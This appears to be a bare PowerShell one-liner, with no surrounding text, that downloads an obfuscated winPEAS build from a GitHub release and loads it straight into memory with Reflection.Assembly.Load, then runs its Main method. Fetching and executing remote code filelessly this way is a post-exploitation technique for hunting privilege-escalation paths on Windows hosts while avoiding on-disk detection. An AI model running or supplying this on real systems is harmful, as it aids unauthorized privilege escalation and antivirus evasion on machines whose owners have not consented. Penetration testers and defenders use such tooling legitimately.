$url="https://github.com/peass-ng/PEASS-ng/releases/download/20241011-2e37ba11/winPEASany_ofs.exe"
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
